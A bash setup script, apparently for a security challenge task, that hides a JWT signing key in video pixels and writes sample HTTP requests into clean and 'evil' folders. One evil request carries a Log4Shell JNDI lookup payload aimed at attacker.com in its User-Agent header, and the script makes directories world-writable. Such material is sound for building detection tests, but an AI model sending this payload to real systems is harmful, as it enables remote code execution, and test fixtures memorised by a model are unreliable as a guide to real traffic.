#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg
    pip3 install pytest PyJWT

    mkdir -p /app/corpus/clean /app/corpus/evil

    cat << 'EOF' > /tmp/setup.py
import os
import jwt

# 1. Generate Video
secret = b"R3d_Ch4nn3l_K3y!"
width, height = 1280, 720
num_frames = 30

with open("/tmp/raw.rgb", "wb") as f:
    for i in range(num_frames):
        frame = bytearray(width * height * 3)
        if i < len(secret):
            idx = (360 * width + 640) * 3
            frame[idx] = secret[i]
        f.write(frame)

os.system("ffmpeg -y -f rawvideo -pixel_format rgb24 -video_size 1280x720 -framerate 30 -i /tmp/raw.rgb -c:v libx264 -preset ultrafast -qp 0 /app/evidence.mp4")

# 2. Generate HTTP Requests
secret_str = "R3d_Ch4nn3l_K3y!"

def write_req(path, token, ua="Mozilla/5.0"):
    req = f"GET /api/data HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {ua}\r\nAuthorization: Bearer {token}\r\n\r\n"
    with open(path, "w") as f:
        f.write(req)

t_clean = jwt.encode({"user": "alice", "admin": False}, secret_str, algorithm="HS256")
write_req('/app/corpus/clean/req1.txt', t_clean)

t_admin = jwt.encode({"user": "bob", "admin": True}, secret_str, algorithm="HS256")
write_req('/app/corpus/evil/req1.txt', t_admin)

t_invalid = jwt.encode({"user": "charlie", "admin": False}, "wrong_key", algorithm="HS256")
write_req('/app/corpus/evil/req2.txt', t_invalid)

t_clean2 = jwt.encode({"user": "dave", "admin": False}, secret_str, algorithm="HS256")
write_req('/app/corpus/evil/req3.txt', t_clean2, ua="${jndi:ldap://attacker.com/a}")
EOF

    python3 /tmp/setup.py
    rm /tmp/setup.py /tmp/raw.rgb

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
